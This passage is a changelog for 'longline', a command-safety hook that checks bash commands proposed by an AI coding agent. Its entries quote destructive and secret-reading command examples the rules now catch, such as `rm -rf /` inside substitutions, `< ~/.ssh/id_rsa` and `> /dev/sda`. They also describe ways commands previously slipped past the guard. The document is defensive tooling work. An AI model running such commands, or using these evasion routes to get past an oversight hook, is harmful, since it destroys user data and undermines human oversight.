- Config merging bug: project and global configs were loaded twice (once during config discovery, again during evaluation), causing CLI flag overrides (`--safety-level`, `--trust-level`) to be silently overwritten by config file values
- Centralized all config merging into `finalize_config()` with correct precedence: CLI flags > project config > global config > embedded defaults

## [0.6.0] - 2026-02-18

### Added

- Optional `reason` field on allowlist entries: when a command is trust-filtered (allowed at a higher trust level but current trust is lower), the reason is shown in the `ask` decision output instead of a generic message
- Descriptive reasons added to all allowlist entries across git, cli-tools, core, and domain-specific files

## [0.5.1] - 2026-02-18

### Added

- Global machine-wide config overlay: `~/.config/longline/longline.yaml` applies the same overrides as project config (safety level, trust level, allowlists, rules, disable_rules) but across all projects
- `--safety-level` CLI flag to override the safety level from command line
- Global config shown in `files`, `rules`, and `check` subcommand output

### Changed

- Renamed `RuleSource::Global` to `RuleSource::BuiltIn`, added `RuleSource::Global` for the new overlay config

## [0.5.0] - 2026-02-17

Closes 21 policy gaps found via red TDD tests. Significantly improves detection of dangerous commands hidden inside substitutions, redirects, absolute paths, compound statements, and wrapper commands.

### Added

- Basename normalization: `/usr/bin/rm -rf /` now matches rules for `rm` and pipeline rules match regardless of path prefix
- `time` transparent wrapper support: commands wrapped in `time` are now evaluated like other wrappers (env, timeout, nice, etc.)
- `uv run` subcommand-based wrapper: `uv run pytest` is unwrapped for policy; `uv pip install` is not
- `find -exec` and `xargs` inner command extraction: `find . -exec rm {} \;` and `xargs rm` are now evaluated against rules instead of relying on the base command's allowlist status
- Redirect rules for stdin secret exposure (`< ~/.ssh/id_rsa`, `< .env`) and system path writes (`> /etc/hosts`, `> /dev/sda`)
- Compound statement redirect propagation: redirects on `{ ...; } > target` and `( ... ) > target` are now applied to inner leaf commands
- Command substitution detection in string nodes, concatenation nodes, bare assignments (`FOO=$(rm -rf /)`), and redirect targets (`> $(cat .env)`)
- Strict config validation: unknown fields in `rules.yaml` now cause exit code 2 instead of being silently ignored

### Changed

- 26 new red_policy_issues regression tests covering all gaps
- Golden test corpus expanded to 1600+ cases

## [0.4.5] - 2026-02-16

### Fixed

- Reclassify trust levels for git and cli-tool allowlists so `gh`/`glab` remote-write commands require correct trust tier

## [0.4.4] - 2026-02-16

### Added

- Typed filter system for `rules` subcommand: filter by `decision:deny`, `level:critical`, `source:project`, `trust:full`

## [0.4.3] - 2026-02-16

### Fixed

- Tighten git push safety rules: `git push --force`, `--force-with-lease`, and variants now correctly trigger `ask`

## [0.4.2] - 2026-02-14

Documentation overhaul release.

### Changed

- Rewrote README for embedded defaults, removed stale manifest.yaml references
- Rewrote SECURITY.md to focus on security model and known limitations
- Auto-push commits and tags in `just release` recipe

## [0.4.1] - 2026-02-13

### Added

- Allowlists for JS dev tool runners: npx, pnpm, pnpm exec, bunx, yarn dlx, yarn exec -- each with an explicit list of known-safe tools (test runners, linters, formatters, build tools)

### Fixed

- Remove blanket `pnpm exec`, `yarn exec`, `poetry run`, `pdm run`, and `rye run` allowlist entries that allowed arbitrary command execution
- Remove command-wrapper tools (npx, bunx, etc.) from bare allowlist -- only specific tool invocations are allowed

## [0.4.0] - 2026-02-11

Three features: project config discovery in subcommands, safe command allowlist expansion, and transparent wrapper support.

### Added

- `--dir` CLI flag for project config discovery in `rules`, `check`, and `files` subcommands
- SOURCE column in table output showing global vs project origin, with project config path banner
- Allowlist additions: shasum, network diagnostics (ping, dig, nslookup, traceroute), ip/arp/route read-only, longline, brew read-only subcommands
- Brew mutation rules (upgrade/uninstall/update/tap/services/link/cleanup)
- Transparent wrapper unwrapping: `env`, `timeout`, `nice`, `nohup`, `strace` are parsed through to evaluate the inner command, with chaining support and depth limit

## [0.3.1] - 2026-02-09

### Added

- Rules are now embedded into the binary at compile time -- no external files needed
- `longline init` subcommand to extract embedded rules to `~/.config/longline/` for customization
- Automatic fallback: `--config` > `~/.config/longline/rules.yaml` > embedded defaults

### Fixed

- `check` subcommand now errors on TTY stdin instead of silently blocking

## [0.3.0] - 2026-02-08

Two features: per-project config overrides and trust-level tiered allowlists.

### Added

- Per-project config via `.claude/longline.yaml`: override safety level, disable rules, add project-specific allowlists and rules
- Project root discovery via `.git` or `.claude` directory (including git worktrees)
- Trust-level tiered allowlists: commands tagged `minimal`, `standard`, or `full` -- project config selects threshold
- `files` subcommand shows trust tier breakdown

### Changed

- All allowlist entries migrated to tagged trust format (breaking: bare string format removed)

## [0.2.2] - 2026-02-07

### Added

- Log rotation with 10-file retention
- Allowlist curl with rules for unsafe flags (`-o`, `--upload-file`, etc.)
- `--version` and `-V` flags auto-allowed on any command

### Fixed

- Kill AI judge subprocesses on timeout instead of leaking them
- Log raw stdout/stderr when AI judge response is unparseable

## [0.2.1] - 2026-02-07

### Added

- Git read-only commands: check-ignore, symbolic-ref, show-ref
- Docker allowlist and destructive operation rules (docker rm, rmi, system prune, compose down)
- Allowlist entries for git-cliff, just release, uv run python manage.py migrate

### Fixed

- Switch AI judge to gpt-5.1-codex-mini with medium reasoning effort
- git-cliff dash-prefixed options now use flags matcher instead of args

## [0.2.0] - 2026-02-05

### Added

- Compound bash statement support: for/while loops, if/else, case statements, compound commands `{ ...; }`, function definitions are now parsed and each inner command is evaluated

### Fixed

- Eliminate flaky AI judge script execution tests

## [0.1.14] - 2026-02-04

### Added

- Lenient AI judge mode (`--ask-ai-lenient`/`--lenient`): prefers allow for normal development tasks

### Fixed

- Increase AI judge timeout to 30s

## [0.1.13] - 2026-02-04

### Added

- AI judge now evaluates Python script file executions (not just inline `-c` code)

### Fixed

- Stop truncating hook audit logs
- Use `pull_policy: always` for GitLab CI runner compatibility

## [0.1.12] - 2026-02-04

### Added

- Extract Python code from additional execution forms (heredocs, here-strings, stdin pipelines, Django shell)

### Fixed

- Consistent `longline:` prefix on all AI judge decision reasons

## [0.1.11] - 2026-02-04

### Fixed

- Tighten git/just allowlists to prevent overly permissive matching
- Remove duplicate test IDs across golden test files

## [0.1.10] - 2026-02-04

### Changed

- Middle-ground policy for ln/cp/mv/tee: allow base commands, deny dangerous argument patterns

### Fixed

- Add bare `git` and `just` to allowlist so `-C` flag commands are not blocked by the base command

## [0.1.9] - 2026-02-02

### Added

- Multi-file rule loading: rules split into domain-specific YAML files (git, filesystem, secrets, network, docker, etc.) referenced by `rules.yaml`
- `files` subcommand to show loaded rule files and counts
- Package installation security rules (pip install, npm install, cargo install, etc.)

### Fixed

- All git rebase commands now require `ask` confirmation

## [0.1.8] - 2026-02-02

### Added

- Expanded allowlist for CI/CD tooling (gh, glab) with API mutation rules

### Fixed

- Secure allowlist matching: positional argument checking and path normalization to prevent path traversal bypasses

## [0.1.7] - 2026-02-02

### Added

- Django manage.py command safety rules (migrate, flush, loaddata, dbshell trigger ask; safe commands allowed)

## [0.1.6] - 2026-02-01

### Fixed

- Handle BrokenPipe in missing config integration test

## [0.1.5] - 2026-02-01

### Added

- GitHub Actions release workflow with tag sync

## [0.1.4] - 2026-02-01

### Fixed

- Return passthrough (`{}`) for non-Bash tools instead of explicit allow decision
- Restore filter-repo replacement rule in CI

## [0.1.3] - 2026-02-01

### Added

- GitLab CI pipeline
- Expanded allowlist: cd, sleep, just, glp, glab, git-cliff, and other common safe commands

### Changed

- Refactored parser and policy into directory modules with extracted submodules

## [0.1.2] - 2026-01-30

### Fixed

- Consistent changelog version format and section spacing

## [0.1.1] - 2026-01-30

### Added

- `none_of` flag matcher for inverse matching (e.g., allow unzip only without `-o`)
- `starts_with` prefix matching for combined flags (e.g., `-inplace` matching `-i`)
- Filesystem, git, and package manager destructive operation rules
- Versioning infrastructure: justfile, cargo-release, git-cliff

### Fixed

- AI judge now handles pipelines and returns structured reasons

## [0.1.0] - 2026-01-28

Initial release.

### Added

- Tree-sitter bash parser: simple commands, pipelines, lists, subshells, command substitutions
- Policy engine with YAML rules: command, pipeline, and redirect matchers
- Allowlist system with rules-override-allowlist ordering
- Hook protocol adapter (JSON stdin/stdout) for Claude Code PreToolUse
- JSONL audit logging
- `rules` and `check` subcommands with table output (comfy-table, NO_COLOR support)
- `--ask-on-deny` flag to downgrade deny to ask
- `--ask-ai` flag for AI evaluation of inline interpreter code
- 40+ default safety rules across 8 categories
- 307 golden test cases across 11 categories
- Command substitution detection in arguments
- Rules for find -delete, find -exec rm, xargs rm
- Secrets rules for .env, SSH keys, AWS credentials, kubeconfig
